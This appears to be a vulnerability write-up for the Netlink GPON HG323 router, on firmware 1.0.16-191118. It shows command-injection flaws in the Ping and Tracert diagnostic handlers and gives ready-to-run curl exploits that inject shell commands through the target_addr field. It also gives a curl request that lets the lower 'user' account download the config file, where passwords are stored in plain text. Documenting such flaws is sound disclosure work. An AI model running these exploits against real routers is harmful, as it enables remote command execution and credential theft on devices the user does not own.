# Reverse Enginneer Netlink GPON HG323  router 

An attempt to reverse engineer Netlink hg323 router to find vulnerablities.

## Firmware : 1.0.16-191118

## RCE
Remote code can be executed by  exploiting either of the daignostics tool "Ping" or "Tracert". Inorder for this to work we should be logged in either as "user" or "admin"

### 1. formPing

vulnerable code


* snprintf(cmd_to_execute,0x100,"ping %s -c 4 -I %s -w 5 %s > /tmp/ping.tmp",param,interface_name,target_addr);
* bin/sh cmd_to_execute

Here we can supply the "target_addr" with  "; payload"

exploit 

curl -s -L -d 'target_addr=1.1.1.1+;+ls&waninf=1_INTERNET_R_VID_' 'http://192.168.1.1/boaform/admin/formPing'


### 2. formTracert

similar to formPing

vulnerable code

* snprintf(cmd_to_execute,0x200,"traceroute %s -I -i %s %s > /tmp/tracert.tmp",param,&some_param,target_addr);

exploit

curl -s -L -d 'target_addr=1.1.1.1+;+ls&waninf=1_INTERNET_R_VID_' 'http://192.168.1.1/boaform/admin/formTracert'

## Dumping creds
We can use the rce exploit to view "/var/config/lastgood.xml" to view passwords or

There are two usernames for the web app
"user" and superuser "admin".
we can abuse the save  config file feature of admin  to get the config file while logged in as "user"

of course the passwords are stored in plain text.


exploit 


curl -s -L -d 'action=saveconfigfile&submit-url=' 'http://192.168.1.1/boaform/admin/formMgmConfig'






